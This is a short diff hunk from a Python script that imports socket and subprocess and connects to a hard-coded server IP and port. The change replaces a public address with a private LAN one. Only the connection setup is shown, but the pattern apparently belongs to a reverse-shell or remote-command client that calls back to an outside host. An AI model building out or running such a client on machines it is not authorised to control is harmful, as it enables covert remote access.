@@ -3,7 +3,7 @@ import os
 import subprocess
 
 s = socket.socket()
-host = "144.126.213.107"  # Change to your server's IP address
+host = "192.168.18.183" # 144.126.213.107 server's IP address
 port = 9999  # Change to your server's port
 s.connect((host, port))
 
